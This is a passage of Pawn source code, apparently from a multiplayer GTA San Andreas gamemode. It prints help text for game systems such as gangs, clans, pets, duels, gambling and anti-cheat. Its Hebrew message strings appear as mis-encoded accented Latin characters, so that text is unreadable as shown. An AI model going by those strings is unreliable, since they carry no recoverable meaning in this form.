						SendClientMessage(playerid,orange," * /lotto - ðéçåù îñôø ììåèå");
						if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,orange," * /startlotto - äúçìú ìåèå");
					}
				}
				case 15:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (15 - DM Zones - îòøëú àéæåøé ãé-àí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áàéæåøé äãé-àí ùáùøúéðå, úåëìå ìäìçí òí ðù÷ éçéã áàéæåø îñåééí áìé äôøòåú îäñáéáä");
						SendClientMessage(playerid,pink," .áøâò ùúîåúå áàéæåø ãé-àí úçæøå ìúçéìúå åú÷áìå àú äðù÷ ùìå");
						SendClientMessage(playerid,purple," » :ô÷åãåú àéæåøé ãé-àí");
						SendClientMessage(playerid,yellow," /sm  /mm  /ww  /uj  /matrix  /rcwar  /heavy  /quitdmz");
						SendClientMessage(playerid,grey," /help mode 15 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (15 - DM Zones - îòøëú àéæåøé ãé-àí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /sm - Sniper Madness ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /mm - Minigun Madness ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /ww - The Wild West ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /uj - Uzi n Jetpack ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /matrix - Matrix ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /rcwar - RC War ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /heavy - Heavy Weapons ëðéñä ìàéæåø äãé-àí");
						SendClientMessage(playerid,orange," * /quitdmz (/qdmz) - éöéàä îàéæåø äãé-àí äðåëçé áå àúä ðîöà");
					}
				}
				case 16:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (16 - Pets - îòøëú çéåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áîåã ùìðå ÷ééîú îòøëú çéåú äîàôùøú ÷ðééä ùì áòì çééí îñåééí");
						SendClientMessage(playerid,pink," .äçéåú éëåìåú ììååú àåúëí á÷øáåú åìòæåø ìëí, áðåñó ðéúðú ìëí àôùøåú ìäåöéà àå ìäùàéø àåúï îçåõ ìòåìí");
						SendClientMessage(playerid,pink," .ìëì çéä ôâéòä çæ÷ä áàåøê ùåðä, îøç÷ øàééä ùåðä, åôøèéí ùåðéí ðåñôéí");
						SendClientMessage(playerid,purple," » :ô÷åãåú çéåú - îøîä 2 áìáã");
						SendClientMessage(playerid,yellow," /buypet  /pets  /pet");
						SendClientMessage(playerid,grey," /help mode 16 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (16 - Pets - îòøëú çéåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /buypet - ÷ðééú çéä");
						SendClientMessage(playerid,orange," * /pets - öôééä áøùéîú äçéåú");
						SendClientMessage(playerid,orange," * /pet on - äåöàú äçéä ùìê ìçåôùé");
						SendClientMessage(playerid,orange," * /pet off - äòìîú äçéä ùìê");
						SendClientMessage(playerid,orange," * /pet attack - ú÷éôú ùç÷ï áòæøú äçéä");
						SendClientMessage(playerid,orange," * /pet stop - äôñ÷ú ú÷éôú äçéä");
						SendClientMessage(playerid,orange," * /pet remove - äòìîú äçéä ùìê");
					}
				}
				case 17:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (17 - Bulletin Board - ìåç îåãòåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áùøúéðå îåöâ ìåç äîåãòåú áëì 10 ã÷åú");
						SendClientMessage(playerid,pink," .áìåç äîåãòåú îåöâåú äåãòåú ùåðåú çùåáåú, åáðåñó äøëá ùîåñê ååàðâ îçôù, àí äåà îçôù");
						SendClientMessage(playerid,purple," » :ô÷åãåú ìåç äîåãòåú");
						SendClientMessage(playerid,yellow," /bb");
						SendClientMessage(playerid,grey," /help mode 17 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (17 - Bulletin Board - ìåç îåãòåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /bb show - öôééä áìåç äîåãòåú");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /bb add - äåñôú îåãòä");
							SendClientMessage(playerid,orange," * /bb remove - îçé÷ú îåãòä");
						}
					}
				}
				case 18:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (18 - Drifts - îòøëú ãøéôèéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ëì àåäáé äãøéôèéí ùáéðéðå éëåìéí ìäúçøåú áéðéäí áãøéôè àéùé áìé àó àçã îñáéá ùéôøéò");
						SendClientMessage(playerid,pink," .äãøéôèéí éëåìéí ìäú÷ééí ø÷ áéï ùðé ùç÷ðéí");
						SendClientMessage(playerid,pink," .ëîå ëï, éù àôùøåú ìáöò àú äãøéôè áî÷åí îñåééí åì÷áåò ôøñ ëñôé ìîðöç");
						SendClientMessage(playerid,purple," » :ô÷åãåú ãøéôèéí");
						SendClientMessage(playerid,yellow," /drift");
						SendClientMessage(playerid,grey," /help mode 18 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (18 - Drifts - îòøëú ãøéôèéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /drift invite - äæîðú ùç÷ï ìãøéôè");
						SendClientMessage(playerid,orange," * /drift accept - àéùåø äæîðä ìãøéôè");
						SendClientMessage(playerid,orange," * /drift cancel - áéèåì äæîðä ìãøéôè");
						SendClientMessage(playerid,orange," * /drift quit - éöéàä îãøéôè");
					}
				}
				case 19:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (19 - Private Battles - îòøëú ÷øáåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áòæøú îòøëú ä÷øáåú äàéùééí ùáùøú ùìðå ðéúï ìòøåê ÷øá àéùé îåì ùç÷ï ùúáçøå áìé àó àçã ùéôøéò");
						SendClientMessage(playerid,pink," .áðåñó, îúàôùøú áçéøä ùì îé÷åí ì÷øá åáçéøä ùì ðù÷ ì÷øá");
						SendClientMessage(playerid,purple," » :ô÷åãåú ÷øáåú àéùééí - îøîä 4 áìáã");
						SendClientMessage(playerid,yellow," /pbattle (/duel)");
						SendClientMessage(playerid,grey," /help mode 19 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (19 - Private Battles - îòøëú ÷øáåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /pbattle invite - äæîðú ùç÷ï ì÷øá");
						SendClientMessage(playerid,orange," * /pbattle accept - àéùåø äæîðä ì÷øá");
						SendClientMessage(playerid,orange," * /pbattle cancel - áéèåì äæîðä ì÷øá");
						SendClientMessage(playerid,orange," * /pbattle quit - éöéàä î÷øá");
						SendClientMessage(playerid,orange," * /pbattle weapons - øùéîú äðù÷éí ì÷øá");
					}
				}
				case 20:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (20 - Secret Ammunations - çðåéåú ðù÷ ñåãéåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áîåã ùìðå îåçáàåú äøáä çðåéåú ðù÷ ñåãéåú");
						SendClientMessage(playerid,pink," ,çðåéåú äðù÷ äñåãéåú ðîöàåú áî÷åîåú ùìà úàøðå ìòöîðå ùäí éäéå áäí");
						SendClientMessage(playerid,pink," .åîåëøéí áäí ðù÷éí ìà-úîéãééí");
						SendClientMessage(playerid,purple," » :ô÷åãåú ðù÷éí ñåãééí - îøîä 3 áìáã");
						SendClientMessage(playerid,yellow," /sbw  /swl  /ccsbw");
						SendClientMessage(playerid,grey," /help mode 20 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (20 - Secret Ammunation - çðåéåú ðù÷ ñåãéåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /sbw - ÷ðééú ðù÷ îçðåú äðù÷éí äñåãéú");
						SendClientMessage(playerid,orange," * /swl - äöâú øùéîú ðù÷éí ùì çðåú äðù÷éí äñåãéú");
						SendClientMessage(playerid,orange," * /ccsbw - ÷ðééú ðù÷ îçðåú äðù÷éí äñåãéú áàîöòåú ëøèéñ àùøàé");
					}
				}
				case 21:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (21 - Air Attacks - îòøëú äú÷ôåú àåéøéåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú îéåçãú áîåã îàôùøú ìú÷åó ùç÷ðéí âí áìé ìäéåú ÷øåáéí àìéäí");
						SendClientMessage(playerid,pink," .áàîöòåú ô÷åãä, ðéúï ìùìåç äú÷ôä àååéøéú ìî÷åí ëìùäå, åáëê ìçñì àú ëì îé ùðîöà ùí");
						SendClientMessage(playerid,pink," <> îú÷ôä àåéøéú áøîä 1 òåìä 12000$");
						SendClientMessage(playerid,pink," <> îú÷ôä àåéøéú áøîä 2 òåìä 20000$");
						SendClientMessage(playerid,pink," <> îú÷ôä àåéøéú áøîä 3 òåìä 35000$");
						SendClientMessage(playerid,pink," <> ùîéøú îé÷åí ìîú÷ôä òåìä 1000$");
						SendClientMessage(playerid,purple," » :ô÷åãåú îú÷ôåú àååéøéåú");
						SendClientMessage(playerid,yellow," /aasave  /aa1  /aa2  /aa3");
						SendClientMessage(playerid,grey," /help mode 21 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (21 - Air Attacks - îòøëú äú÷ôåú àåéøéåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /aasave - ùîéøú äú÷ôä àåéøéú");
						SendClientMessage(playerid,orange," * /aa1 - éöéøú äú÷ôä àåéøéú áøîä 1");
						SendClientMessage(playerid,orange," * /aa2 - éöéøú äú÷ôä àåéøéú áøîä 2");
						SendClientMessage(playerid,orange," * /aa3 - éöéøú äú÷ôä àåéøéú áøîä 3");
					}
				}
				case 22:
				{
					SendClientMessage(playerid,lightblue," ~~~ (22 - Bonuses - îòøëú áåðåñéí) Mode - îåã ~~~");
					SendClientMessage(playerid,pink," .áòæøú äáåðåñéí ðéúï ìäøååéç äøáä ëñó òì äøéâú ùç÷ðéí");
					SendClientMessage(playerid,purple," » :øùéîú äáåðåñéí");
					SendClientMessage(playerid,yellow,"  òì ëì äøéâä áøöó ú÷áì 100$ ëôåì äøöó  òì ëì äøéâä ùì 100 ùç÷ðéí ú÷áì 2500$");
					SendClientMessage(playerid,yellow,"  òì ëì äøéâä ùì 500 ùç÷ðéí ú÷áì 7500$   òì ëì äøéâä ùì 1000 ùç÷ðéí ú÷áì 12000$");
					SendClientMessage(playerid,yellow,"  MicroUzi Sawnoff :ú÷áì 1000$ òì ëì äøéâä ùì 10 ùç÷ðéí òí àçã îäðù÷éí");
					SendClientMessage(playerid,yellow,"  RocketLauncher :ú÷áì 1200$ òì ëì äøéâä ùì 20 ùç÷ðéí òí àçã îäðù÷éí äáàéí");
					SendClientMessage(playerid,yellow,"  ðöçåï á 5 îìçîåú ùøú îàæ ëðéñúê ìùøú ééæëä àåúê á 50000$  òì ëì ùòä áùøú ú÷áì 5000$");
				}
				case 23:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (23 - Gambling - îòøëú äéîåøéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îàçø åäùîèðå àú ääéîåøéí îäîåã, äçæøðå àåúí ëô÷åãä");
						SendClientMessage(playerid,pink," .ðéúðú àôùøåú ìëì ùç÷ï ìäîø îëì î÷åí îúé ùéøöä");
						SendClientMessage(playerid,pink," .ùéîå ìá: ñéëåéé äæëééä äí 1 ì 6, îä ùàåîø ù 16%% ùàúí úæëå");
						SendClientMessage(playerid,pink," .áîéãä åæëéúí áäéîåø - ú÷áìå ñëåí îåëôì ùì îñôø äëñó ùäéîøúí òìéå");
						SendClientMessage(playerid,purple," » :ô÷åãåú ääéîåøéí");
						SendClientMessage(playerid,yellow," /gambling");
						SendClientMessage(playerid,grey," /help mode 23 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (23 - Gambling - îòøëú äéîåøéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /gambling - äéîåø òì ëñó");
					}
				}
				case 24:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (24 - Gangs - îòøëú ëðåôéåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äëðåôéåú ùìðå îàôùøú ìëí, äùç÷ðéí, ìéöåø ìòöîëí ÷áåöåú æîðéåú åìùç÷ áäï òí çáøéëí");
						SendClientMessage(playerid,pink," .ðéúï ìãáø òí çáøé äëðåôééä ùìëí áàîöòåú ùéîåù áúå ! áúçéìú ëì äåãòä");
						SendClientMessage(playerid,purple," » :ô÷åãåú ëðåôééä");
						SendClientMessage(playerid,yellow," /gang  /gdeposit  /gwithdraw  /gbalance  /ganginfo  /gangs  /gdepositall  /gwithdrawall");
						SendClientMessage(playerid,grey," /help mode 24 [1-2] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (24 - Gangs - îòøëú ëðåôéåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /gang create - éöéøú ëðåôéä");
						SendClientMessage(playerid,orange," * /gang invite - äæîðú ùç÷ï ìëðåôéä ùìê");
						SendClientMessage(playerid,orange," * /gang accept - àéùåø äæîðä ìëðåôéä");
						SendClientMessage(playerid,orange," * /gang cancel - áéèåì äæîðä ìëðåôéä");
						SendClientMessage(playerid,orange," * /gang quit - éöéàä îëðåôéä");
						SendClientMessage(playerid,orange," * /gang kick - äåöàú ùç÷ï îëðåôéä");
						SendClientMessage(playerid,orange," * /gang leader - äòáøú âéùåú äìéãø ùìä ëðåôéä ìùç÷ï àçø");
						SendClientMessage(playerid,orange," * /gdeposit - äëðñú ëñó ìáð÷ äëðåôéä");
						SendClientMessage(playerid,grey," * /help mode 24 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (24 - Gangs - îòøëú ëðåôéåú) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /gwithdraw - äåöàú ëñó îáð÷ äëðåôéä");
						SendClientMessage(playerid,orange," * /gbalance - áãé÷ú îàæï äëñó ááð÷ äëðåôéä");
						SendClientMessage(playerid,orange," * /ganginfo - ÷áìú îéãò àåãåú ëðåôéä îñåééîú");
						SendClientMessage(playerid,orange," * /gangs - öôééä áøùéîú äëðåôéåú");
						SendClientMessage(playerid,orange," * /gdepositall - äëðñú ëì äëñó ùáéãê ìáð÷ äëðåôéä");
						SendClientMessage(playerid,orange," * /gwithdrawall - äåöàú ëì äëñó îáð÷ äëðåôéä");
					}
				}
				case 25:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (25 - Account - îòøëú îùúîùéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," îòøëú çùáåðåú äîùúîùéí îàôùøú äøùîä åäúçáøåú ìùøú, äôåúçéí áôðéëí àôùøåéåú ùåðåú");
						SendClientMessage(playerid,pink," .åáðåñó ùîéøú ôøèé îùç÷ ìëðéñåúéëí äáàåú");
						SendClientMessage(playerid,pink," .÷ééîåú îñôø ô÷åãåú îùúîùéí ùéîåùéåú, àùø îúàôùøåú ìëì äøîåú");
						SendClientMessage(playerid,purple," » :ô÷åãåú îùúîùéí");
						SendClientMessage(playerid,yellow," /register  /login  /changepass  /changename  /editprofile  /showprofile");
						SendClientMessage(playerid,yellow," /diary  /friends  /setting");
						SendClientMessage(playerid,grey," /help mode 25 [1-3] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (25 - Account - îòøëú îùúîùéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /register - äøùîä ìùøú");
						SendClientMessage(playerid,orange," * /login - äúçáøåú ìùøú");
						SendClientMessage(playerid,orange," * /changepass - ùéðåé ñéñîà");
						SendClientMessage(playerid,orange," * /changename - ùéðåé ùí îùúîù");
						SendClientMessage(playerid,orange," * /editprofile skin save - ùîéøú äãîåú ùìê ìúîéã");
						SendClientMessage(playerid,orange," * /editprofile skin del - îçé÷ú äãîåú äùîåøä ùìê");
						SendClientMessage(playerid,orange," * /editprofile icq - äëðñú àééñé÷éå ìôøåôéì");
						SendClientMessage(playerid,orange," * /editprofile messenger - äëðñú îñðâ'ø ìôøåôéì");
						SendClientMessage(playerid,grey," * /help mode 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (25 - Account - îòøëú îùúîùéí) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /editprofile email - äëðñú àéîééì ìôøåôéì");
						SendClientMessage(playerid,orange," * /editprofile country - äëðñú îé÷åí ìôøåôéì");
						SendClientMessage(playerid,orange," * /editprofile birthdate - äëðñú úàøéê ìéãä ìôøåôéì");
						SendClientMessage(playerid,orange," * /editprofile name - äëðñú ùí àîéúé ìôøåôéì");
						SendClientMessage(playerid,orange," * /showprofile - áãé÷ú ôøåôéì ùì ùç÷ï");
						SendClientMessage(playerid,orange," * /diary show - öôééä áéåîï ùìê");
						SendClientMessage(playerid,orange," * /diary add - äåñôú ùåøä ìéåîï ùìê");
						SendClientMessage(playerid,orange," * /diary remove - îçé÷ú ùåøä îäéåîï ùìê");
						SendClientMessage(playerid,grey," * /help mode 3 - ìäîùê");
					}
					if(num == 3)
					{
						SendClientMessage(playerid,lightblue," ~~~ (25 - Account - îòøëú îùúîùéí) Mode Commands [#3] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /diary reset - àéôåñ äéåîï ùìê");
						SendClientMessage(playerid,orange," * /friends my - öôééä áøùéîú äçáøéí ùìê");
						SendClientMessage(playerid,orange," * /friends of - öôééä áøùéîú äçáøéí ùì ùç÷ï àçø");
						SendClientMessage(playerid,orange," * /friends add - äåñôú çáø ìøùéîú äçáøéí ùìê");
						SendClientMessage(playerid,orange," * /friends remove - îçé÷ú çáø îøùéîú äçáøéí ùìê");
						SendClientMessage(playerid,orange," * /friends reset - àéôåñ øùéîú äçáøéí ùìê");
						SendClientMessage(playerid,orange," * /setting - òøéëú äâãøåú ùåðåú");
					}
				}
				case 26:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (26 - Clans - îòøëú ÷ìàðéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ëì ëðåôééä éëåìä ìäôåê ì÷ìàï, åëì ÷ìàï ì÷ìàï øùîé");
						SendClientMessage(playerid,pink," .÷ìàðéí øéùîééí î÷áìéí îô÷ãä");
						SendClientMessage(playerid,pink," .äîô÷ãåú äí àéæåøéí àéùééí ùì ÷ìàðéí øéùîééí áùøú");
						SendClientMessage(playerid,pink," .ëì îô÷ãä ëåììú úåñôåú ìîùç÷, îëåðéåú, åôé÷àôéí");
						SendClientMessage(playerid,purple," » :ô÷åãåú ÷ìàðéí");
						SendClientMessage(playerid,yellow," /clan  /ogate  /cgate  /cdeposit  /cwithdraw  /cbalance  /cdepositall");
						SendClientMessage(playerid,yellow," /clans");
						SendClientMessage(playerid,grey," /help mode 26 [1-4] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (26 - Clans - îòøëú ÷ìàðéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /clan invite - äæîðú ùç÷ï ì÷ìàï");
						SendClientMessage(playerid,orange," * /clan accept - àéùåø äæîðä ì÷ìàï");
						SendClientMessage(playerid,orange," * /clan cancel - áéèåì äæîðä ì÷ìàï");
						SendClientMessage(playerid,orange," * /clan quit - éöéàä î÷ìàï");
						SendClientMessage(playerid,orange," * /clan kick - äåöàú ùç÷ï îä÷ìàï");
						SendClientMessage(playerid,orange," * /clan setlevel - ùéðåé úô÷éã ùì ùç÷ï á÷ìàï");
						SendClientMessage(playerid,orange," * /clan edit cmd - òøéëú äô÷åãä ìùéâåø ìîô÷ãä");
						SendClientMessage(playerid,orange," * /clan edit foot - òøéëú îé÷åí äùéâåø ìîô÷ãä");
						SendClientMessage(playerid,grey," * /help mode 26 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (26 - Clans - îòøëú ÷ìàðéí) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /clan edit vehicle - òøéëú îé÷åí äùéâåø ìîô÷ãä áøëá");
						SendClientMessage(playerid,orange," * /clan edit tests - òøéëú àôùøåú ä÷ìàï ìäéåú ôúåç ìèñèéí");
						SendClientMessage(playerid,orange," * /clan edit mute - äùú÷ú ä÷ìàï ö'àè");
						SendClientMessage(playerid,orange," * /clan edit color - ùéðåé öáò ä÷ìàï");
						SendClientMessage(playerid,orange," * /clan bank lock - ðòéìú áð÷ ä÷ìàï");
						SendClientMessage(playerid,orange," * /clan bank maxwithdraw - äâáìú äñëåí äëñôé àùø ðéúï ìäåöéà îäáð÷");
						SendClientMessage(playerid,orange," * /clan bank setpos - ùéðåé îé÷åí áð÷ ä÷ìàï");
						SendClientMessage(playerid,orange," * /clan peace [clan name] ask - á÷ùú ùìåí òí ÷ìàï îñåééí");
						SendClientMessage(playerid,grey," * /help mode 26 3 - ìäîùê");
					}
					if(num == 3)
					{
						SendClientMessage(playerid,lightblue," ~~~ (26 - Clans - îòøëú ÷ìàðéí) Mode Commands [#3] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /clan peace [clan name] accept - àéùåø á÷ùú äùìåí ùì ÷ìàï åäëøæú ùìåí áéï ä÷ìàðéí");
						SendClientMessage(playerid,orange," * /clan peace [clan name] cancel - áéèåì á÷ùú äùìåí ùì ä÷ìàï");
						SendClientMessage(playerid,orange," * /clan peace [clan name] destroy - äùîãú ùìåí áéï ÷ìàðéí");
						SendClientMessage(playerid,orange," * /clan info members - áãé÷ú îéãò àåãåú çáøé ÷ìàï îñåééí");
						SendClientMessage(playerid,orange," * /clan info details - áãé÷ú ôøèé ÷ìàï îñåééí");
						SendClientMessage(playerid,orange," * /ogate (og) - ôúéçú ùòø äîô÷ãä");
						SendClientMessage(playerid,orange," * /cgate (cg) - ñâéøú ùòø äîô÷ãä");
						SendClientMessage(playerid,orange," * /cdeposit - äô÷ãú ëñó ááð÷ ä÷ìàï");
						SendClientMessage(playerid,grey," * /help mode 26 4 - ìäîùê");
					}
					if(num == 4)
					{
						SendClientMessage(playerid,lightblue," ~~~ (26 - Clans - îòøëú ÷ìàðéí) Mode Commands [#4] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /cwithdraw - äåöàú ëñó îáð÷ ä÷ìàï");
						SendClientMessage(playerid,orange," * /cbalance - áãé÷ú îàæï äëñó ááð÷ ä÷ìàï");
						SendClientMessage(playerid,orange," * /cdepositall - äô÷ãú ëì äëñó ùáéãê ááð÷ ä÷ìàï");
						SendClientMessage(playerid,orange," * /clans - øùéîú ä÷ìàðéí");
					}
				}
				case 27:
				{
					SendClientMessage(playerid,lightblue," ~~~ (27 - AntiCheat - àðèéö'éè) Mode - îåã ~~~");
					SendClientMessage(playerid,pink," .îòøëú äàðèéö'éè äçæ÷ä ùìðå îùàéøä àú äùøú ùìðå ð÷é åîàåáèç îö'éèøéí");
					SendClientMessage(playerid,pink,acname " :ùí îòøëú äàðèéö'éè äðåëçéú");
					SendClientMessage(playerid,purple," » :äà÷éí îåâðéí");
					SendClientMessage(playerid,yellow," RCON ëñó  ðù÷éí  úé÷ ñéìåï  ôéðâ  ôéé÷ ÷éì  îò÷á  ôøéöä ì");
					SendClientMessage(playerid,yellow," ëãåøé ðù÷  ëéðåééí ìà ú÷éðéí  øëáéí îòåôôéí");
					SendClientMessage(playerid,red," * .ùéîå ìá: øöåé ùìà ìðñåú àú îòøëú äàðèéö'éè ùìðå");
					SendClientMessage(playerid,red," * .äéà îáéàä àæäøåú úîéãéåú åáñëåí àæäøåú îñåééí äéà úùòä îäùøú ìöîéúåú");
				}
				case 28:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (28 - Wanted Level - îòøëú øîåú îáå÷ùåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .äëåëáéí ùéù ìéã ùîëí (àí éù) äí çì÷ îîòøëú øîú äîáå÷ùåú áùøúéðå");
						SendClientMessage(playerid,pink," .îòøëú æå úøàä ìëí ëîä àúí îáå÷ùéí");
						SendClientMessage(playerid,yellow," <> äøéâú ùç÷ï îåñéôä øîú îáå÷ùåú àçú");
						SendClientMessage(playerid,yellow," <> äøéâú ùç÷ï áòáåãä îåñéôä 3 øîåú îáå÷ùåú");
						SendClientMessage(playerid,yellow," <> äøéâú ùåèø îåñéôä 5 øîåú îáå÷ùåú");
						SendClientMessage(playerid,pink," .áëì ôòí ùùç÷ï éâéò ìøîú îáå÷ùåú 10 ééúååñó ìå ëåëá îùèøä");
						SendClientMessage(playerid,purple," » :ô÷åãåú øîú äîáå÷ùåú");
						SendClientMessage(playerid,yellow," /resetwanted");
						SendClientMessage(playerid,grey," /help mode 28 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (28 - Wanted Level - îòøëú øîåú îáå÷ùåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /resetwanted - îçé÷ú øîú äîáå÷ùåú ùìê");
					}
				}
				case 29:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (29 - Phone - èìôåï) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áòæøú îòøëú äèìôåðéí äééçåãéú ìùøúéðå, ðéúï ìðäì ùéçåú ôøèéåú òí ùç÷ðéí àçøéí");
						SendClientMessage(playerid,pink," .ùéçåú àìå äï áúùìåí ùì ãåìø àçã ìùðééä");
						SendClientMessage(playerid,purple," » :ô÷åãåú ôìàôåï");
						SendClientMessage(playerid,yellow," /phone");
						SendClientMessage(playerid,grey," /help mode 29 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (29 - Phone - èìôåï) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /phone call - äú÷ùøåú ìùç÷ï");
